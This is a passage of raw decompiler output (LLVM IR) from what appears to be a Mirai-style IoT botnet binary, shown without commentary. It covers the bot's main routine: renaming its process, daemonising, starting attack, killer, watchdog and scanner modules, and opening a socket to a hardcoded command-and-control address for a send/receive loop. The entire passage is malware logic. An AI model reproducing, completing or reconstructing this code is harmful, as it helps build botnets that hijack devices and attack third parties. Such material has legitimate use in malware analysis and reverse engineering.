  %v2_d8f8 = call i32 @__GI_sigaddset(i32 %v2_d8d4, i32 2)
  %v0_d8fc = load i32, i32* @r5, align 4
  store i32 %v0_d8fc, i32* %r2.global-to-local, align 4
  %v4_d908 = call i32 @__GI_sigprocmask(i32 %v0_d8fc, i32* nonnull %stack_var_-64, i32 %v0_d8fc)
  %v2_d914 = call i32 @bsd_signal(i32 17, i32 1)
  %v2_d920 = call i32 @bsd_signal(i32 5, i32 54744)
  %v0_d924 = call i32 @util_local_addr()
  store i32 ptrtoint (i16** @global_var_24a58.93 to i32), i32* %r2.global-to-local, align 4
  store i16 -6144, i16* bitcast (i32* @global_var_24a5a.95 to i16*), align 4
  store i32 1494907823, i32* @global_var_24a5c.94, align 4
  store i32 2, i32* %r3.global-to-local, align 4
  store i32 %v0_d924, i32* @global_var_24a4c.59, align 4
  store i16 2, i16* bitcast (i16** @global_var_24a58.93 to i16*), align 4
  %v6_d94c = call i32 @table_init(i32 %v0_d924, i32 ptrtoint (i32* @global_var_24a4c.59 to i32), i32 ptrtoint (i16** @global_var_24a58.93 to i32), i32 2)
  store i32 ptrtoint (i32* @global_var_d750.84 to i32), i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_21dc0.86 to i32), i32* %ip.global-to-local, align 4
  %v2_d958 = ptrtoint i32* %stack_var_-152 to i32
  store i32 %v2_d958, i32* @sb, align 4
  store i32 ptrtoint (i32* @global_var_d750.84 to i32), i32* @global_var_21dc0.86, align 4
  %v1_d960 = call i32 @ensure_single_instance(i32 %v6_d94c)
  %v1_d964 = call i32 @rand_init(i32 %v1_d960)
  store i32 %v2_d958, i32* @r0, align 4
  store i32 32, i32* @r1, align 4
  %v0_d970 = call i32 @util_zero()
  %v0_d974 = load i32, i32* @r6, align 4
  %v7_d974 = icmp eq i32 %v0_d974, 2
  br i1 %v7_d974, label %dec_label_pc_daa4, label %dec_label_pc_d97c

dec_label_pc_d97c:                                ; preds = %dec_label_pc_daa4, %entry, %dec_label_pc_dab4
  %v0_d97c = call i32 @rand_next()
  store i32 %v0_d97c, i32* @r6, align 4
  %v0_d984 = load i32, i32* @r8, align 4
  %v1_d984 = inttoptr i32 %v0_d984 to i32*
  %v2_d984 = load i32, i32* %v1_d984, align 4
  %v1_d988 = inttoptr i32 %v2_d984 to i8*
  %v2_d988 = call i32 @util_strlen(i8* %v1_d988)
  %v0_d990 = load i32, i32* @r8, align 4
  %v1_d990 = inttoptr i32 %v0_d990 to i32*
  %v2_d990 = load i32, i32* %v1_d990, align 4
  %v1_d994 = inttoptr i32 %v2_d990 to i8*
  %v2_d994 = call i32 @util_strlen(i8* %v1_d994)
  %v1_d998 = sub i32 20, %v2_d988
  %v0_d9a0 = load i32, i32* @r6, align 4
  %v3_d9a4 = urem i32 %v0_d9a0, %v1_d998
  %v2_d9a8 = ptrtoint i32* %stack_var_-120 to i32
  store i32 %v2_d9a8, i32* @r5, align 4
  %v2_d9ac = add i32 %v3_d9a4, %v2_d994
  store i32 %v2_d9ac, i32* @r4, align 4
  %v2_d9b8 = call i32 @rand_alpha_str(i32 %v2_d9a8, i32 %v2_d9ac)
  %v2_d9bc = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v2_d9bc, i32* @lr, align 4
  %v1_d9c0 = load i32, i32* @r4, align 4
  %v2_d9c0 = add i32 %v1_d9c0, %v2_d9bc
  store i32 %v2_d9c0, i32* %r3.global-to-local, align 4
  store i32 0, i32* @sl, align 4
  %v0_d9cc = load i32, i32* @r8, align 4
  %v1_d9cc = inttoptr i32 %v0_d9cc to i32*
  %v2_d9cc = load i32, i32* %v1_d9cc, align 4
  store i32 %v2_d9cc, i32* @r0, align 4
  %v3_d9d0 = add i32 %v2_d9c0, -80
  %v4_d9d0 = inttoptr i32 %v3_d9d0 to i8*
  store i8 0, i8* %v4_d9d0, align 1
  %v2_d9d4 = inttoptr i32 %v2_d9cc to i8*
  %v3_d9d4 = call i32 @util_strcpy(i8* %v2_d9d4, i32 %v2_d9a8)
  store i32 32, i32* @r1, align 4
  store i32 %v2_d9a8, i32* @r0, align 4
  %v0_d9e0 = call i32 @util_zero()
  %v0_d9e4 = call i32 @rand_next()
  store i32 %v0_d9e4, i32* @r7, align 4
  %v0_d9ec = load i32, i32* @r8, align 4
  %v1_d9ec = inttoptr i32 %v0_d9ec to i32*
  %v2_d9ec = load i32, i32* %v1_d9ec, align 4
  %v1_d9f0 = inttoptr i32 %v2_d9ec to i8*
  %v2_d9f0 = call i32 @util_strlen(i8* %v1_d9f0)
  store i32 %v2_d9f0, i32* @r6, align 4
  %v0_d9f8 = load i32, i32* @r8, align 4
  %v1_d9f8 = inttoptr i32 %v0_d9f8 to i32*
  %v2_d9f8 = load i32, i32* %v1_d9f8, align 4
  %v1_d9fc = inttoptr i32 %v2_d9f8 to i8*
  %v2_d9fc = call i32 @util_strlen(i8* %v1_d9fc)
  %v0_da00 = load i32, i32* @r6, align 4
  %v1_da00 = sub i32 20, %v0_da00
  %v0_da08 = load i32, i32* @r7, align 4
  %v3_da0c = urem i32 %v0_da08, %v1_da00
  %v2_da10 = add i32 %v3_da0c, %v2_d9fc
  store i32 %v2_da10, i32* @r4, align 4
  %v2_da1c = call i32 @rand_alpha_str(i32 %v2_d9a8, i32 %v2_da10)
  store i32 %v2_d9bc, i32* %r2.global-to-local, align 4
  %v1_da24 = load i32, i32* @r4, align 4
  %v2_da24 = add i32 %v1_da24, %v2_d9bc
  store i32 %v2_da24, i32* %r3.global-to-local, align 4
  %v0_da28 = load i32, i32* @sl, align 4
  %v1_da28 = trunc i32 %v0_da28 to i8
  %v3_da28 = add i32 %v2_da24, -80
  %v4_da28 = inttoptr i32 %v3_da28 to i8*
  store i8 %v1_da28, i8* %v4_da28, align 1
  %v4_da34 = call i32 @prctl(i32 15, i32 %v2_d9a8, i32 %v2_d9bc, i32 %v2_da24)
  %v1_da3c = call i32 @table_unlock_val(i32 5)
  %v3_da4c = call i32 @table_retrieve_val(i32 5, i32* nonnull %stack_var_-48)
  %v3_da50 = load i32, i32* %stack_var_-48, align 4
  store i32 %v3_da50, i32* @r2, align 4
  %v2_da5c = call i32 @__GI___libc_write(i32 1, i32 %v3_da4c)
  store i32 1, i32* @r2, align 4
  %v2_da6c = call i32 @__GI___libc_write(i32 1, i32 ptrtoint (i32* @global_var_195fc.105 to i32))
  %v1_da74 = call i32 @table_lock_val(i32 5)
  %v1_da78 = call i32 @attack_init(i32 %v1_da74)
  %v1_da7c = call i32 @killer_init(i32 %v1_da78)
  %v1_da80 = call i32 @watchdog_maintain(i32 %v1_da7c)
  %v0_da84 = call i32 @__libc_fork()
  %v1_da88 = load i32, i32* @sl, align 4
  %v7_da8c = icmp sgt i32 %v0_da84, %v1_da88
  br i1 %v7_da8c, label %dec_label_pc_da90, label %dec_label_pc_dadc

dec_label_pc_da90:                                ; preds = %dec_label_pc_d97c
  ret i32 %v1_da88

dec_label_pc_daa4:                                ; preds = %entry
  %v0_daa4 = load i32, i32* @r8, align 4
  %v1_daa4 = add i32 %v0_daa4, 4
  %v2_daa4 = inttoptr i32 %v1_daa4 to i32*
  %v3_daa4 = load i32, i32* %v2_daa4, align 4
  %v1_daa8 = inttoptr i32 %v3_daa4 to i8*
  %v2_daa8 = call i32 @util_strlen(i8* %v1_daa8)
  %v8_dab0 = icmp sgt i32 %v2_daa8, 31
  br i1 %v8_dab0, label %dec_label_pc_d97c, label %dec_label_pc_dab4

dec_label_pc_dab4:                                ; preds = %dec_label_pc_daa4
  %v0_dab4 = load i32, i32* @r8, align 4
  %v1_dab4 = add i32 %v0_dab4, 4
  %v2_dab4 = inttoptr i32 %v1_dab4 to i32*
  %v3_dab4 = load i32, i32* %v2_dab4, align 4
  store i32 %v2_d958, i32* @r0, align 4
  %v2_dabc = bitcast i32* %stack_var_-152 to i8*
  %v3_dabc = call i32 @util_strcpy(i8* %v2_dabc, i32 %v3_dab4)
  %v0_dac0 = load i32, i32* @r8, align 4
  %v1_dac0 = add i32 %v0_dac0, 4
  %v2_dac0 = inttoptr i32 %v1_dac0 to i32*
  %v3_dac0 = load i32, i32* %v2_dac0, align 4
  %v1_dac8 = inttoptr i32 %v3_dac0 to i8*
  %v2_dac8 = call i32 @util_strlen(i8* %v1_dac8)
  store i32 %v2_dac8, i32* @r1, align 4
  store i32 %v3_dac0, i32* @r0, align 4
  %v0_dad4 = call i32 @util_zero()
  br label %dec_label_pc_d97c

dec_label_pc_dadc:                                ; preds = %dec_label_pc_d97c
  %v1_dadc = call i32 @__GI_setsid(i32 %v0_da84)
  %v0_dae4 = load i32, i32* @sl, align 4
  %v1_dae8 = call i32 @__GI___libc_close(i32 %v0_dae4)
  %v1_daf0 = call i32 @__GI___libc_close(i32 1)
  %v1_daf8 = call i32 @__GI___libc_close(i32 2)
  store i32 ptrtoint (i32* @global_var_21dbc.107 to i32), i32* @fp, align 4
  %v1_db00 = call i32 @attack_init(i32 %v1_daf8)
  %v1_db04 = call i32 @killer_init(i32 %v1_db00)
  %v1_db08 = call i32 @watchdog_maintain(i32 %v1_db04)
  %v1_db0c = call i32 @scanner_init(i32 %v1_db08)
  %v0_db10 = load i32, i32* @sl, align 4
  %v2_db14 = ptrtoint i32* %stack_var_-280 to i32
  store i32 %v2_db14, i32* @r7, align 4
  %v2_db18 = ptrtoint i32* %stack_var_-408 to i32
  store i32 %v2_db18, i32* @r6, align 4
  %v2_dbf8 = ptrtoint i32* %stack_var_-72 to i32
  %v2_dc48 = ptrtoint i32* %stack_var_-168 to i32
  %v2_de24 = ptrtoint i32* %stack_var_-56 to i32
  %v2_de2c = ptrtoint i8** %stack_var_-42 to i32
  %v2_dfd4 = ptrtoint i32* %stack_var_-1432 to i32
  %v2_de48 = ptrtoint i32* %stack_var_-52 to i32
  %v1_defc = bitcast i32* %stack_var_-152 to i8*
  %v2_debc = ptrtoint i32* %stack_var_-88 to i32
  %v1_ded8 = sub i32 0, %v1_dadc
  br label %dec_label_pc_db1c

dec_label_pc_db1c:                                ; preds = %dec_label_pc_df5c, %dec_label_pc_dff8, %bb44, %dec_label_pc_def8, %dec_label_pc_dd2c, %dec_label_pc_dd1c, %bb41, %dec_label_pc_e04c, %dec_label_pc_dfb8, %dec_label_pc_df6c, %dec_label_pc_df48, %dec_label_pc_de74, %dec_label_pc_dd9c, %dec_label_pc_dcd4, %dec_label_pc_dadc
  %stack_var_-1436.0 = phi i32 [ %v0_db10, %dec_label_pc_dadc ], [ %stack_var_-1436.0, %bb41 ], [ %stack_var_-1436.1, %dec_label_pc_dd1c ], [ %stack_var_-1436.1, %dec_label_pc_dd2c ], [ %stack_var_-1436.1, %bb44 ], [ %stack_var_-1436.1, %dec_label_pc_df6c ], [ %stack_var_-1436.1, %dec_label_pc_dd9c ], [ %stack_var_-1436.1, %dec_label_pc_dff8 ], [ %stack_var_-1436.1, %dec_label_pc_e04c ], [ %stack_var_-1436.1, %dec_label_pc_dfb8 ], [ %stack_var_-1436.1, %dec_label_pc_dcd4 ], [ %stack_var_-1436.1, %dec_label_pc_def8 ], [ %stack_var_-1436.1, %dec_label_pc_df48 ], [ %stack_var_-1436.1, %dec_label_pc_de74 ], [ %stack_var_-1436.1, %dec_label_pc_df5c ]
  store i32 0, i32* %stack_var_-280, align 4
  store i32 4, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_db28

dec_label_pc_db28:                                ; preds = %dec_label_pc_db28, %dec_label_pc_db1c
  %v1_db2c = phi i32 [ %v1_db30, %dec_label_pc_db28 ], [ 4, %dec_label_pc_db1c ]
  store i32 0, i32* %r2.global-to-local, align 4
  %v2_db2c = load i32, i32* @r7, align 4
  %v3_db2c = add i32 %v2_db2c, %v1_db2c
  %v4_db2c = inttoptr i32 %v3_db2c to i32*
  store i32 0, i32* %v4_db2c, align 4
  %v0_db30 = load i32, i32* %r3.global-to-local, align 4
  %v1_db30 = add i32 %v0_db30, 4
  store i32 %v1_db30, i32* %r3.global-to-local, align 4
  %v7_db34 = icmp eq i32 %v1_db30, 128
  br i1 %v7_db34, label %dec_label_pc_db3c, label %dec_label_pc_db28

dec_label_pc_db3c:                                ; preds = %dec_label_pc_db28
  %v0_db3c = load i32, i32* %r2.global-to-local, align 4
  store i32 %v0_db3c, i32* %stack_var_-408, align 4
  store i32 4, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_db44

dec_label_pc_db44:                                ; preds = %dec_label_pc_db44, %dec_label_pc_db3c
  %v1_db48 = phi i32 [ %v1_db4c, %dec_label_pc_db44 ], [ 4, %dec_label_pc_db3c ]
  store i32 0, i32* @r4, align 4
  %v2_db48 = load i32, i32* @r6, align 4
  %v3_db48 = add i32 %v2_db48, %v1_db48
  %v4_db48 = inttoptr i32 %v3_db48 to i32*
  store i32 0, i32* %v4_db48, align 4
  %v0_db4c = load i32, i32* %r3.global-to-local, align 4
  %v1_db4c = add i32 %v0_db4c, 4
  store i32 %v1_db4c, i32* %r3.global-to-local, align 4
  %v7_db50 = icmp eq i32 %v1_db4c, 128
  br i1 %v7_db50, label %dec_label_pc_db58, label %dec_label_pc_db44

dec_label_pc_db58:                                ; preds = %dec_label_pc_db44
  store i32 ptrtoint (i32* @global_var_21db8.88 to i32), i32* %r3.global-to-local, align 4
  %v2_db5c = load i32, i32* @global_var_21db8.88, align 4
  %v7_db60 = icmp eq i32 %v2_db5c, -1
  br i1 %v7_db60, label %dec_label_pc_db8c, label %dec_label_pc_db68

dec_label_pc_db68:                                ; preds = %dec_label_pc_db58
  %v3_db68 = udiv i32 %v2_db5c, 32
  %v3_db6c = mul nuw nsw i32 %v3_db68, 4
  store i32 %v2_d9bc, i32* %ip.global-to-local, align 4
  %v2_db74 = add i32 %v3_db6c, %v2_d9bc
  store i32 %v2_db74, i32* %r3.global-to-local, align 4
  %v1_db78 = add i32 %v2_db74, -240
  %v2_db78 = inttoptr i32 %v1_db78 to i32*
  %v3_db78 = load i32, i32* %v2_db78, align 4
  %v1_db7c = urem i32 %v2_db5c, 32
  %v7_db84 = shl i32 1, %v1_db7c
  %v8_db84 = or i32 %v3_db78, %v7_db84
  store i32 %v8_db84, i32* %r2.global-to-local, align 4
  store i32 %v8_db84, i32* %v2_db78, align 4
  br label %dec_label_pc_db8c

dec_label_pc_db8c:                                ; preds = %dec_label_pc_db58, %dec_label_pc_db68
  %v2_db8c = load i32, i32* @global_var_21dbc.107, align 4
  store i32 %v2_db8c, i32* @r3, align 4
  %v7_db90 = icmp eq i32 %v2_db8c, -1
  store i32 ptrtoint (i32* @global_var_21dbc.107 to i32), i32* @r8, align 4
  br i1 %v7_db90, label %dec_label_pc_ddb4, label %dec_label_pc_db9c

dec_label_pc_db9c:                                ; preds = %dec_label_pc_ddb4, %dec_label_pc_db8c, %bb43
  %v2_dba0 = load i8, i8* bitcast (i8** @global_var_21f3c.110 to i8*), align 4
  %v2_dba4 = icmp eq i8 %v2_dba0, 0
  %v2_dcf0 = load i32, i32* @global_var_21dbc.107, align 4
  store i32 %v2_dcf0, i32* %ip.global-to-local, align 4
  %v3_dcf4 = udiv i32 %v2_dcf0, 32
  store i32 %v3_dcf4, i32* %r3.global-to-local, align 4
  br i1 %v2_dba4, label %dec_label_pc_dcf0, label %dec_label_pc_dbac

dec_label_pc_dbac:                                ; preds = %dec_label_pc_db9c
  %v3_dbb8 = mul nuw nsw i32 %v3_dcf4, 4
  %v2_dbbc = add i32 %v3_dbb8, %v2_d9bc
  store i32 %v2_dbbc, i32* %r3.global-to-local, align 4
  %v1_dbc0 = add i32 %v2_dbbc, -368
  %v2_dbc0 = inttoptr i32 %v1_dbc0 to i32*
  %v3_dbc0 = load i32, i32* %v2_dbc0, align 4
  %v1_dbc4 = urem i32 %v2_dcf0, 32
  %v7_dbcc = shl i32 1, %v1_dbc4
  %v8_dbcc = or i32 %v3_dbc0, %v7_dbcc
  store i32 %v8_dbcc, i32* %r2.global-to-local, align 4
  store i32 %v8_dbcc, i32* %v2_dbc0, align 4
  br label %dec_label_pc_dbd4

dec_label_pc_dbd4:                                ; preds = %dec_label_pc_dcf0, %dec_label_pc_dbac
  store i32 ptrtoint (i32* @global_var_21db8.88 to i32), i32* %r3.global-to-local, align 4
  %v2_dbd8 = load i32, i32* @global_var_21db8.88, align 4
  store i32 0, i32* @lr, align 4
  %v0_dbe0 = load i32, i32* %ip.global-to-local, align 4
  %v5_dbe4 = icmp slt i32 %v0_dbe0, %v2_dbd8
  br i1 %v5_dbe4, label %bb41, label %bb

bb:                                               ; preds = %dec_label_pc_dbd4
  br label %bb41

bb41:                                             ; preds = %dec_label_pc_dbd4, %bb
  %v0_dbf4 = phi i32 [ %v2_dbd8, %dec_label_pc_dbd4 ], [ %v0_dbe0, %bb ]
  store i32 10, i32* %stack_var_-72, align 4
  %v1_dbf4 = add i32 %v0_dbf4, 1
  store i32 %v2_dbf8, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 %v2_db18, i32* %r2.global-to-local, align 4
  %v5_dc10 = call i32 @__libc_select(i32 %v1_dbf4, i32 %v2_db14, i32 %v2_db18, i32 0, i32 %v2_dbf8)
  %v8_dc14 = icmp eq i32 %v5_dc10, -1
  br i1 %v8_dc14, label %dec_label_pc_db1c, label %dec_label_pc_dc1c

dec_label_pc_dc1c:                                ; preds = %bb41
  %v6_dc10 = trunc i32 %v5_dc10 to i16
  %v3_dc1c = icmp eq i16 %v6_dc10, 0
  br i1 %v3_dc1c, label %dec_label_pc_dc24, label %dec_label_pc_dc58

dec_label_pc_dc24:                                ; preds = %dec_label_pc_dc1c
  %v5_dc30 = srem i32 %stack_var_-1436.0, 6
  %v4_dc38 = sub i32 %stack_var_-1436.0, %v5_dc30
  store i32 %v4_dc38, i32* %r3.global-to-local, align 4
  %v2_dc40 = icmp eq i32 %v5_dc30, 0
  %v1_dc44 = add i32 %stack_var_-1436.0, 1
  store i32 %v1_dc44, i32* @lr, align 4
  store i32 %v2_dc48, i32* %r2.global-to-local, align 4
  %v7_dc4c = inttoptr i32 %v5_dc10 to i8*
  store i8* %v7_dc4c, i8** %stack_var_-42, align 4
  br i1 %v2_dc40, label %dec_label_pc_de24, label %dec_label_pc_dc58

dec_label_pc_dc58:                                ; preds = %dec_label_pc_dc1c, %dec_label_pc_dc24, %dec_label_pc_de24
  %stack_var_-1436.1 = phi i32 [ %v1_dc44, %dec_label_pc_de24 ], [ %v1_dc44, %dec_label_pc_dc24 ], [ %stack_var_-1436.0, %dec_label_pc_dc1c ]
  store i32 ptrtoint (i32* @global_var_21db8.88 to i32), i32* %r3.global-to-local, align 4
  %v2_dc5c = load i32, i32* @global_var_21db8.88, align 4
  %v7_dc60 = icmp eq i32 %v2_dc5c, -1
  br i1 %v7_dc60, label %dec_label_pc_dc8c, label %dec_label_pc_dc68

dec_label_pc_dc68:                                ; preds = %dec_label_pc_dc58
  %v3_dc68 = udiv i32 %v2_dc5c, 32
  %v3_dc6c = mul nuw nsw i32 %v3_dc68, 4
  store i32 %v2_d9bc, i32* %ip.global-to-local, align 4
  %v2_dc74 = add i32 %v3_dc6c, %v2_d9bc
  store i32 %v2_dc74, i32* %r3.global-to-local, align 4
  %v1_dc78 = add i32 %v2_dc74, -240
  %v2_dc78 = inttoptr i32 %v1_dc78 to i32*
  %v3_dc78 = load i32, i32* %v2_dc78, align 4
  %v1_dc7c = urem i32 %v2_dc5c, 32
  %v6_dc80 = ashr i32 %v3_dc78, %v1_dc7c
  store i32 %v6_dc80, i32* %r2.global-to-local, align 4
  %v1_dc84 = urem i32 %v6_dc80, 2
  %v2_dc84 = icmp eq i32 %v1_dc84, 0
  br i1 %v2_dc84, label %dec_label_pc_dc8c, label %dec_label_pc_deb0

dec_label_pc_dc8c:                                ; preds = %dec_label_pc_dc68, %dec_label_pc_dc58
  %v2_dc90 = load i8, i8* bitcast (i8** @global_var_21f3c.110 to i8*), align 4
  %v3_dc90 = zext i8 %v2_dc90 to i32
  store i32 %v3_dc90, i32* @r4, align 4
  %v2_dc94 = icmp eq i8 %v2_dc90, 0
  %v2_dd1c = load i32, i32* @global_var_21dbc.107, align 4
  br i1 %v2_dc94, label %dec_label_pc_dd1c, label %dec_label_pc_dc9c

dec_label_pc_dc9c:                                ; preds = %dec_label_pc_dc8c
  %v3_dca0 = udiv i32 %v2_dd1c, 32
  store i32 %v2_d9bc, i32* %r2.global-to-local, align 4
  %v3_dca8 = mul nuw nsw i32 %v3_dca0, 4
  %v2_dcac = add i32 %v3_dca8, %v2_d9bc
  store i32 %v2_dcac, i32* %r3.global-to-local, align 4
  %v1_dcb0 = add i32 %v2_dcac, -368
  %v2_dcb0 = inttoptr i32 %v1_dcb0 to i32*
  %v3_dcb0 = load i32, i32* %v2_dcb0, align 4
  %v1_dcb4 = urem i32 %v2_dd1c, 32
  %v6_dcb8 = ashr i32 %v3_dcb0, %v1_dcb4
  store i32 %v6_dcb8, i32* %r2.global-to-local, align 4
  store i32 ptrtoint (i8** @global_var_21f3c.110 to i32), i32* %r3.global-to-local, align 4
  store i32 0, i32* %ip.global-to-local, align 4
  %v1_dcc4 = urem i32 %v6_dcb8, 2
  %v2_dcc4 = icmp eq i32 %v1_dcc4, 0
  store i8 0, i8* bitcast (i8** @global_var_21f3c.110 to i8*), align 4
  store i32 ptrtoint (i32* @global_var_21dbc.107 to i32), i32* @r5, align 4
  br i1 %v2_dcc4, label %dec_label_pc_dcd4, label %dec_label_pc_de40

dec_label_pc_dcd4:                                ; preds = %dec_label_pc_dc9c
  store i32 56540, i32* @lr, align 4
  %v1_dcd8 = icmp ne i32 %v2_dd1c, -1
  call void @__pseudo_cond_branch(i1 %v1_dcd8, i32 ptrtoint (i32* @global_var_145e0.112 to i32))
  store i32 -1, i32* %r3.global-to-local, align 4
  %v1_dce0 = load i32, i32* @r5, align 4
  %v2_dce0 = inttoptr i32 %v1_dce0 to i32*
  store i32 -1, i32* %v2_dce0, align 4
  %v1_dce8 = call i32 @sleep(i32 1)
  br label %dec_label_pc_db1c

dec_label_pc_dcf0:                                ; preds = %dec_label_pc_db9c
  store i32 %v2_d9bc, i32* %r2.global-to-local, align 4
  %v3_dcfc = mul nuw nsw i32 %v3_dcf4, 4
  %v2_dd00 = add i32 %v3_dcfc, %v2_d9bc
  store i32 %v2_dd00, i32* %r3.global-to-local, align 4
  %v1_dd04 = add i32 %v2_dd00, -240
  %v2_dd04 = inttoptr i32 %v1_dd04 to i32*
  %v3_dd04 = load i32, i32* %v2_dd04, align 4
  %v1_dd08 = urem i32 %v2_dcf0, 32
  %v7_dd10 = shl i32 1, %v1_dd08
  %v8_dd10 = or i32 %v3_dd04, %v7_dd10
  store i32 %v8_dd10, i32* %r2.global-to-local, align 4
  store i32 %v8_dd10, i32* %v2_dd04, align 4
  br label %dec_label_pc_dbd4

dec_label_pc_dd1c:                                ; preds = %dec_label_pc_dc8c
  %v7_dd20 = icmp eq i32 %v2_dd1c, -1
  store i32 ptrtoint (i32* @global_var_21dbc.107 to i32), i32* @r8, align 4
  br i1 %v7_dd20, label %dec_label_pc_db1c, label %dec_label_pc_dd2c

dec_label_pc_dd2c:                                ; preds = %dec_label_pc_dd1c
  %v3_dd2c = udiv i32 %v2_dd1c, 32
  store i32 %v2_d9bc, i32* %r2.global-to-local, align 4
  %v3_dd34 = mul nuw nsw i32 %v3_dd2c, 4
  %v2_dd38 = add i32 %v3_dd34, %v2_d9bc
  store i32 %v2_dd38, i32* %r3.global-to-local, align 4
  %v1_dd3c = add i32 %v2_dd38, -240
  %v2_dd3c = inttoptr i32 %v1_dd3c to i32*
  %v3_dd3c = load i32, i32* %v2_dd3c, align 4
  %v1_dd40 = urem i32 %v2_dd1c, 32
  %v6_dd44 = ashr i32 %v3_dd3c, %v1_dd40
  store i32 %v6_dd44, i32* %r2.global-to-local, align 4
  %v1_dd48 = urem i32 %v6_dd44, 2
  %v2_dd48 = icmp eq i32 %v1_dd48, 0
  br i1 %v2_dd48, label %dec_label_pc_db1c, label %dec_label_pc_dd50

dec_label_pc_dd50:                                ; preds = %dec_label_pc_dd2c
  %v6_dd54 = inttoptr i32 %v3_dc90 to i8*
  store i8* %v6_dd54, i8** %stack_var_-42, align 4
  store i32 %v2_de2c, i32* @sl, align 4
  %v0_dd58 = call i32 @__GI___errno_location()
  %v0_dd5c = load i32, i32* @r4, align 4
  %v2_dd5c = inttoptr i32 %v0_dd58 to i32*
  store i32 %v0_dd5c, i32* %v2_dd5c, align 4
  store i32 %v0_dd58, i32* @r5, align 4
  store i32 16386, i32* %r3.global-to-local, align 4
  %v2_dd6c = load i32, i32* @global_var_21dbc.107, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v4_dd78 = call i32 @__libc_recv(i32 %v2_dd6c, i32 %v2_de2c, i32 2, i32 16386)
  %v7_dd7c = icmp eq i32 %v4_dd78, -1
  br i1 %v7_dd7c, label %dec_label_pc_df5c, label %dec_label_pc_dd84

dec_label_pc_dd84:                                ; preds = %dec_label_pc_dd50
  %v2_dd84 = icmp eq i32 %v4_dd78, 0
  br i1 %v2_dd84, label %dec_label_pc_df6c, label %dec_label_pc_dd8c

dec_label_pc_dd8c:                                ; preds = %dec_label_pc_dd84
  store i32 %v2_dc48, i32* %ip.global-to-local, align 4
  %v3_dd90 = load i8*, i8** %stack_var_-42, align 4
  %v4_dd90 = ptrtoint i8* %v3_dd90 to i32
  store i32 %v4_dd90, i32* %r3.global-to-local, align 4
  %v2_dd94 = icmp eq i8* %v3_dd90, null
  br i1 %v2_dd94, label %dec_label_pc_dd9c, label %dec_label_pc_df9c

dec_label_pc_dd9c:                                ; preds = %dec_label_pc_dd8c
  %v2_dd9c = load i32, i32* @global_var_21dbc.107, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v1_dda8 = add i32 %v4_dd90, 16384
  store i32 %v1_dda8, i32* %r3.global-to-local, align 4
  %v4_ddac = call i32 @__libc_recv(i32 %v2_dd9c, i32 %v2_de2c, i32 2, i32 %v1_dda8)
  br label %dec_label_pc_db1c

dec_label_pc_ddb4:                                ; preds = %dec_label_pc_db8c
  %v0_ddbc = load i32, i32* @r4, align 4
  store i32 %v0_ddbc, i32* %r2.global-to-local, align 4
  %v3_ddc0 = call i32 @socket(i32 2, i32 1, i32 %v0_ddbc)
  %v7_ddc4 = icmp eq i32 %v3_ddc0, -1
  store i32 %v3_ddc0, i32* @r5, align 4
  %v1_ddcc = load i32, i32* @r8, align 4
  %v2_ddcc = inttoptr i32 %v1_ddcc to i32*
  store i32 %v3_ddc0, i32* %v2_ddcc, align 4
  br i1 %v7_ddc4, label %dec_label_pc_db9c, label %dec_label_pc_ddd4

dec_label_pc_ddd4:                                ; preds = %dec_label_pc_ddb4
  %v0_ddd4 = load i32, i32* @r4, align 4
  store i32 %v0_ddd4, i32* @r2, align 4
  %v2_dddc = call i32 @__libc_fcntl(i32 %v3_ddc0, i32 3)
  %v1_dde4 = or i32 %v2_dddc, 2048
  store i32 %v1_dde4, i32* @r2, align 4
  %v0_dde8 = load i32, i32* @r5, align 4
  %v2_ddec = call i32 @__libc_fcntl(i32 %v0_dde8, i32 4)
  %v2_ddf4 = load i32, i32* @global_var_21dc0.86, align 4
  store i32 %v2_ddf4, i32* %r3.global-to-local, align 4
  %v2_ddf8 = icmp eq i32 %v2_ddf4, 0
  br i1 %v2_ddf8, label %bb43, label %bb42

bb42:                                             ; preds = %dec_label_pc_ddd4
  br label %bb43

bb43:                                             ; preds = %dec_label_pc_ddd4, %bb42
  %v2_de00 = xor i1 %v2_ddf8, true
  call void @__pseudo_cond_branch(i1 %v2_de00, i32 ptrtoint (i32* @global_var_10a64.113 to i32))
  store i32 ptrtoint (i8** @global_var_21f3c.110 to i32), i32* %ip.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v2_de0c = load i32, i32* @global_var_21dbc.107, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  store i8 1, i8* bitcast (i8** @global_var_21f3c.110 to i8*), align 4
  %v4_de1c = call i32 @__libc_connect(i32 %v2_de0c, i32 ptrtoint (i16** @global_var_24a58.93 to i32), i32 16)
  br label %dec_label_pc_db9c

dec_label_pc_de24:                                ; preds = %dec_label_pc_dc24
  %v2_de28 = load i32, i32* @global_var_21dbc.107, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v5_de38 = call i32 @__libc_send(i32 %v2_de28, i32 %v2_de2c, i32 2, i32 16384)
  br label %dec_label_pc_dc58

dec_label_pc_de40:                                ; preds = %dec_label_pc_dc9c
  store i32 4, i32* @r4, align 4
  store i32 %v2_de48, i32* %r3.global-to-local, align 4
  store i32 0, i32* %stack_var_-52, align 4
  store i32 1, i32* @r1, align 4
  store i32 %v2_de24, i32* %ip.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 4, i32* %stack_var_-56, align 4
  %v5_de64 = call i32 @getsockopt(i32 %v2_dd1c, i32 1, i32 4, i32 %v2_de48, i32 %v2_de24)
  %v3_de68 = load i32, i32* %stack_var_-52, align 4
  store i32 %v3_de68, i32* %r3.global-to-local, align 4
  %v2_de6c = icmp eq i32 %v3_de68, 0
  br i1 %v2_de6c, label %dec_label_pc_def8, label %dec_label_pc_de74

dec_label_pc_de74:                                ; preds = %dec_label_pc_de40
  %v2_de74 = load i32, i32* @global_var_21dbc.107, align 4
  %v1_de78 = call i32 @__GI___libc_close(i32 %v2_de74)
  store i32 -1, i32* %r3.global-to-local, align 4
  %v1_de80 = load i32, i32* @r5, align 4
  %v2_de80 = inttoptr i32 %v1_de80 to i32*
  store i32 -1, i32* %v2_de80, align 4
  %v0_de84 = call i32 @rand_next()
  %v3_de8c = zext i32 %v0_de84 to i64
